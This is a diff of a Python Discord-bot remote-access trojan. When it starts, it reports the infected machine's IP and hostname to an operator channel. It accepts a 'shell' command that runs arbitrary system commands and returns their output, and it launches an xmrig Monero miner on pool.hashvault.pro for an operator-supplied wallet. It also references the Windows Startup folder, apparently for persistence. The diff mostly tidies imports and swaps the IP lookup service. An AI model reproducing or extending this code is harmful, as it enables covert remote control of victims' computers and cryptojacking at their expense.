@@ -1,16 +1,8 @@
 from discord.ext import commands
-from discord import app_commands
-from urllib import request
-import multiprocessing
-import requests
-import discord
-import psutil
-import socket
-import sys
-import os
+import requests, discord, psutil, socket, sys, os
 
-token = '' # Token
-channel_id =  # Channel ID
+token = 'MToken.mnt.discord' # Token
+channel_id = 111111111111111111  # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -19,10 +11,8 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 bot.remove_command('help')
 
 # client
-ip = requests.get('https://api.ipify.org').text.strip()
+ip = requests.get('https://sheesh.rip/ip').headers['IP']
 hostname = socket.gethostname()
-total_cpu = multiprocessing.cpu_count()
-hcpu = int(total_cpu / 2)
 appdata = os.getenv("AppData")
 startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
 temp = os.getenv('temp')
@@ -36,27 +26,19 @@ async def on_ready():
     print(f'{bot.user}')
     await channel.send(f"``[+] {ip}@{hostname}: Session opened``")
 
-
-# ----- Bot Commands ----- #
+# ----- Commands ----- #
 
 # sessions
 @bot.command()
 async def sessions(ctx):
     await ctx.send(f"``[*] {ip}@{hostname}``")
-
-# exit
-@bot.command()
-async def exit(ctx):
-    await ctx.send(f"``[-] {ip}@{hostname}: Session closed``")
-    sys.exit()
-
+    
 # shell
 @bot.command()
 async def shell(ctx, *args):
     arguments = ' '.join(args)
     stream = os.popen(arguments)
     output = stream.read()
-    
     if sys.getsizeof(output) > 2000:
         await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
     else:
@@ -72,8 +54,8 @@ async def check(ctx):
 
 # miner
 @bot.command()
-async def miner(ctx, arg1):
-    wallet = ''.join(arg1)
+async def miner(ctx, walletArg):
+    wallet = ''.join(walletArg)
     os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
     await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")
 
@@ -83,6 +65,5 @@ async def stopminer(ctx):
     if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
         os.popen("taskkill /F /IM xmrig.exe /T")
         await ctx.send(f"``[-] {ip}@{hostname}: Miner stoped``")
-
 
 bot.run(token)
